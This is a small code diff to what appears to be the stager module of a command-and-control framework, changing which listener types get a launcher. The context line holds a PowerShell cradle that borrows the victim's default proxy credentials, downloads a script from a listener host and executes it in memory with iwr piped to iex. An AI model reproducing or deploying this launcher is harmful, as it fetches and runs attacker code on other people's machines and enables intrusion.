@@ -91,7 +91,7 @@ class Stager:
             return ""
 
         launcher = ""
-        if listener.module in ["http", "http_com"]:
+        if listener.module in ["http"]:
             if language == "powershell":
                 launcher_ps = f"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{host}/download/powershell/')-UseBasicParsing|iex"
 
